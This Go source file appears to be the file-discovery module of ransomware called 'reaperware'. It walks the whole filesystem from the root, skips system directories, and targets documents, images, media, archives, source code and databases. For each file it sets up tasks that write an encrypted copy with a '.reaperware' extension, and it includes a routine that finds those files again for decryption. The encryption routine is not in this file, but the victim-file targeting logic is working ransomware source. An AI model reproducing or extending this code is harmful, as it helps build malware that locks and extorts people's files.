package filedirectory

import (
	"log"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
)

var (
	// Define targeted file extensions
	Extensions = []string{
		".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", ".txt", ".rtf", ".csv",
		".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tif", ".tiff", ".svg", ".raw",
		".mp4", ".mov", ".avi", ".wmv", ".mkv", ".mp3", ".wav",
		".zip", ".rar", ".7z", ".tar", ".gz", ".bz2",
		".html", ".htm", ".php", ".js", ".css", ".java", ".py", ".c", ".cpp", ".sql",
		".db", ".mdb", ".accdb", ".sqlite",
		".psd", ".ai", ".dwg", ".indd",
		".xml", ".json", ".log", ".ini", ".config",
	}
	// Define directories to exclude (case-sensitive)
	ExcludedDirs = []string{
		"/proc", "/sys", "/dev", // Linux system directories
		"C:\\Windows", "C:\\Program Files", "C:\\Program Files (x86)", // Windows system directories
	}
	// Encrypted file extension
	EncryptedExtension = []string{
		".reaperware",
	}
)

func RootDir() string {
	// Determine root directory
	rootDir := "/"
	if runtime.GOOS == "windows" {
		rootDir = "C:\\"
	}
	return rootDir
}

type FileScanner struct {
	RootDir          string   // Directory to start scanning
	TargetExtensions []string // List of targeted file extensions
	ExcludedDirs     []string // List of directories to exclude
	Results          chan string
	wg               sync.WaitGroup
	ScannedFiles     []string   // Store scanned file paths
	mu               sync.Mutex // Mutex to safely append to ScannedFiles
}

// NewFileScanner creates a new FileScanner instance
func NewFileScanner(rootDir string, extensions, excludedDirs []string) *FileScanner {
	return &FileScanner{
		RootDir:          rootDir,
		TargetExtensions: extensions,
		ExcludedDirs:     excludedDirs,
		Results:          make(chan string, 100), // Buffered channel
	}
}

// Start initiates the file scanning process
func (fs *FileScanner) Start() {
	// Launch results printer in a goroutine
	go fs.printResults()

	// Start scanning the root directory
	log.Println("[+] Scanning for files")
	fs.wg.Add(1)
	go fs.scanDirectory(fs.RootDir)

	// Wait for all goroutines to complete
	fs.wg.Wait()

	// Close the results channel
	close(fs.Results)
}

// scanDirectory scans a single directory for targeted files
func (fs *FileScanner) scanDirectory(dir string) {
	defer fs.wg.Done()

	// Skip directories in the exclusion list
	if fs.isExcludedDir(dir) {
		log.Printf("[-] Skipping excluded directory: %s\n", dir)
		return
	}

	files, err := os.ReadDir(dir)
	if err != nil {
		log.Printf("[-] Error accessing %s: %v\n", dir, err)
		return
	}

	for _, file := range files {
		path := filepath.Join(dir, file.Name())
		if file.IsDir() {
			// Process subdirectory in a new goroutine
			fs.wg.Add(1)
			go fs.scanDirectory(path)
		} else if fs.isTargetFile(file.Name()) {
			fs.mu.Lock()
			fs.ScannedFiles = append(fs.ScannedFiles, path)
			fs.mu.Unlock()
			fs.Results <- path
		}
	}
}

// isTargetFile checks if a file has a targeted extension
func (fs *FileScanner) isTargetFile(fileName string) bool {
	ext := strings.ToLower(filepath.Ext(fileName))
	for _, targetExt := range fs.TargetExtensions {
		if ext == targetExt {
			return true
		}
	}
	return false
}

// isExcludedDir checks if a directory is in the exclusion list
func (fs *FileScanner) isExcludedDir(dir string) bool {
	for _, excludedDir := range fs.ExcludedDirs {
		if strings.HasPrefix(dir, excludedDir) {
			return true
		}
	}
	return false
}

// printResults continuously reads from the Results channel and prints each file path
func (fs *FileScanner) printResults() {
	for file := range fs.Results {
		log.Println(file)
	}
}

func (fs *FileScanner) ToFileTasks() []FileTask {
	// Use a map to track unique input file paths
	uniqueFiles := make(map[string]bool)
	var fileTasks []FileTask

	for _, inputFilePath := range fs.ScannedFiles {

		// BUG: Need to see why we get duplicates
		// Check if the file path is already processed
		if _, exists := uniqueFiles[inputFilePath]; exists {
			continue // Skip duplicates
		}

		// Mark the file path as processed
		uniqueFiles[inputFilePath] = true

		outputFilePath := inputFilePath + ".reaperware"
		decryptedFilePath := inputFilePath + ".dec"
		fileTasks = append(fileTasks, FileTask{
			InputFilePath:  inputFilePath,
			OutputFilePath: outputFilePath,
			DecryptedPath:  decryptedFilePath,
		})
	}
	return fileTasks
}

// Create a FileTask to decrypt files
func (fs *FileScanner) ToDecryptTasks() []FileTask {
	var decryptTasks []FileTask
	for _, encryptedFilePath := range fs.ScannedFiles {
		// Generate paths for the decrypted file
		decryptedFilePath := strings.TrimSuffix(encryptedFilePath, ".reaperware")
		decryptTasks = append(decryptTasks, FileTask{
			InputFilePath:  encryptedFilePath,
			OutputFilePath: decryptedFilePath, // You can change this to match your decryption logic
			DecryptedPath:  decryptedFilePath,
		})
	}
	return decryptTasks
}

func FindTheEncryptedFiles(rootDir string) []FileTask {
	// Initialize the FileScanner for `.reaperware` files
	fileScanner := NewFileScanner(rootDir, EncryptedExtension, ExcludedDirs)

	// Start scanning
	fileScanner.Start()

	// Convert `.reaperware` files into FileTask entries for further processing
	return fileScanner.ToDecryptTasks()
}
